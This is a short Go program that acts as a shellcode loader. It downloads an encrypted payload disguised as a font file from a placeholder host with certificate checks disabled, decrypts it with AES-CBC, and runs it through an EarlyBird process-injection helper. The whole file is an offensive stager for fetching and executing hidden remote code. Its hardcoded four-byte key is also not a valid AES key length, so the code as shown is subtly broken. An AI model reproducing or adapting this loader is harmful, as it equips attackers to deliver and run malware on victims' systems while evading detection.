package main

import (
	
	"crypto/aes"
	"crypto/cipher"
	
	"crypto/tls"
	"fmt"
	"io"
	"net/http"

	"github.com/3santree/go-shellcode-helper/cmd/EarlyBird"
)

func main() {
	url := "https://123.com/font.woff"
	
	key := []byte("1234")
	
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	resp, err := client.Get(url)
	if err != nil {
		fmt.Println(err)
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err)
	}
	
	sc := decrypt(body[16:], key, body[:16])
	
	EarlyBird.Run(sc)
}

func decrypt(data, key, iv []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}
	fmt.Println("blocksize: ", block.BlockSize())
	fmt.Println("ivsize: ", len(iv))
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(data, data)
	return data
}
